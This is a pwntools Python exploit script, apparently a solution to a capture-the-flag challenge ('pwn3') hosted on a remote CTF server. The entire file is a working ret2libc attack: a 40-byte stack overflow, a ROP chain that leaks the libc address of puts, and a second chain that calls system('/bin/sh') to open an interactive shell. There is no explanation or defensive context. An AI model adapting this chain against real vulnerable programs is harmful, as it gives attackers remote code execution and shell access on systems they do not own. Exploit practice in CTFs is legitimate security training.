#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'pwn3')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(exe)

host = args.HOST or 'challs.n00bzunit3d.xyz'
port = int(args.PORT or 42450)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

payload = b'A'*40
payload += p64(rop.find_gadget(['pop rdi','ret'])[0])
payload += p64(exe.got['puts'])
payload += p64(exe.sym['puts'])
payload += p64(exe.sym['main'])
io.sendlineafter(b'flag?', payload)
io.recvline()
io.recvline()
leak = unpack(io.recvline()[:-1], 'all')
libc.address = leak - libc.sym['puts']
info(f"libc puts at: {hex(leak)}")
info(f"libc base at: {hex(libc.address)}")

payload = b'A'*40
payload += p64(rop.find_gadget(['pop rdi','ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.sym['system'])
io.sendlineafter(b'flag?', payload)

io.interactive()

